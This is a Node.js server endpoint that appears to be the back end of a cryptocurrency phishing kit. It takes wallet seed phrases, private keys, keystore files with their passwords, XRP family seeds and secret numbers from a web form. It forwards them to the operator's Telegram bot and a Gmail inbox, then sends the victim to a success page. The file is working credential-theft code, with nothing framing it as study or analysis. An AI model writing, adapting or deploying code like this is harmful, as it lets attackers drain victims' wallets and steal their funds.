// api/process.js
require('dotenv').config();
const { IncomingForm } = require('formidable');
const nodemailer = require('nodemailer');
const fetch = require('node-fetch');

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    // Parse the multipart/form-data request
    const form = new IncomingForm();
    
    try {
        const { fields, files } = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) {
                    reject(err);
                    return;
                }
                resolve({ fields, files });
            });
        });

        // Extract form fields
        const {
            wallet = 'Not provided',
            phrase,
            keystore_json,
            keystore_password,
            private_key,
            family_seed,
            ...secretNumbers
        } = fields;

        // Validate that at least one meaningful field is provided
        const hasMeaningfulData = (phrase && phrase !== 'Not provided') || 
                                 (keystore_json && keystore_json !== 'Not provided' && keystore_password && keystore_password !== 'Not provided') || 
                                 (private_key && private_key !== 'Not provided') || 
                                 (family_seed && family_seed !== 'Not provided') || 
                                 Object.keys(secretNumbers).some(key => secretNumbers[key] && secretNumbers[key] !== 'Not provided');
        if (!hasMeaningfulData) {
            return res.status(400).json({ success: false, error: 'No meaningful data provided. Please fill at least one field.' });
        }

        // Construct Telegram message
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatID = process.env.TELEGRAM_CHAT_ID;
        if (!telegramBotToken || !telegramChatID) {
            console.error('Telegram configuration missing');
            return res.status(500).json({ success: false, error: 'Telegram configuration missing' });
        }

        let message = `🚀 *New Wallet Submission!*\n\n`;
        message += `💼 *Wallet:* \`${wallet}\`\n`;
        if (phrase && phrase !== 'Not provided') message += `🔑 *Phrase:* \`${phrase}\`\n`;
        if (keystore_json && keystore_json !== 'Not provided') message += `📜 *Keystore JSON:* \`${keystore_json}\`\n`;
        if (keystore_password && keystore_password !== 'Not provided') message += `🔐 *Keystore Password:* \`${keystore_password}\`\n`;
        if (private_key && private_key !== 'Not provided') message += `🔏 *Private Key:* \`${private_key}\`\n`;
        if (family_seed && family_seed !== 'Not provided') message += `🌱 *Family Seed:* \`${family_seed}\`\n`;

        const secretNumberKeys = Object.keys(secretNumbers).filter(key => key.startsWith('secret_number_') && secretNumbers[key] && secretNumbers[key] !== 'Not provided');
        if (secretNumberKeys.length > 0) {
            message += `🔢 *Secret Numbers:*\n`;
            secretNumberKeys.forEach((key, index) => {
                message += `➖ Key ${index + 1}: \`${secretNumbers[key]}\`\n`;
            });
        }

        // Send to Telegram
        let telegramSuccess = false;
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: telegramChatID,
                text: message,
                parse_mode: 'Markdown',
                disable_notification: false
            })
        });
        const telegramResult = await telegramResponse.json();
        if (telegramResult.ok) {
            telegramSuccess = true;
        } else {
            console.error('Telegram error:', telegramResult);
        }

        // Send to Email
        let emailSuccess = false;
        const emailTo = process.env.EMAIL_TO;
        const emailUser = process.env.EMAIL_USER;
        const emailPass = process.env.EMAIL_PASS;

        if (emailTo && emailUser && emailPass) {
            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: emailUser,
                    pass: emailPass
                }
            });

            const mailOptions = {
                from: emailUser,
                to: emailTo,
                subject: 'New Wallet Data Submission',
                html: message.replace(/\n/g, '<br>').replace(/`(.*?)`/g, '<code>$1</code>')
            };

            try {
                await transporter.sendMail(mailOptions);
                emailSuccess = true;
            } catch (emailError) {
                console.error('Email error:', emailError.message);
            }
        } else {
            console.error('Email configuration missing');
        }

        // Redirect to success.html if Telegram or Email succeeded
        if (telegramSuccess || emailSuccess) {
            // Redirect directly with a 302 status code
            res.status(302).setHeader('Location', '/success.html');
            return res.end();
        } else {
            return res.status(500).json({ success: false, error: 'Failed to send data via Telegram and Email' });
        }
    } catch (error) {
        console.error('Server error:', error.message);
        return res.status(500).json({ success: false, error: 'Server error: ' + error.message });
    }
};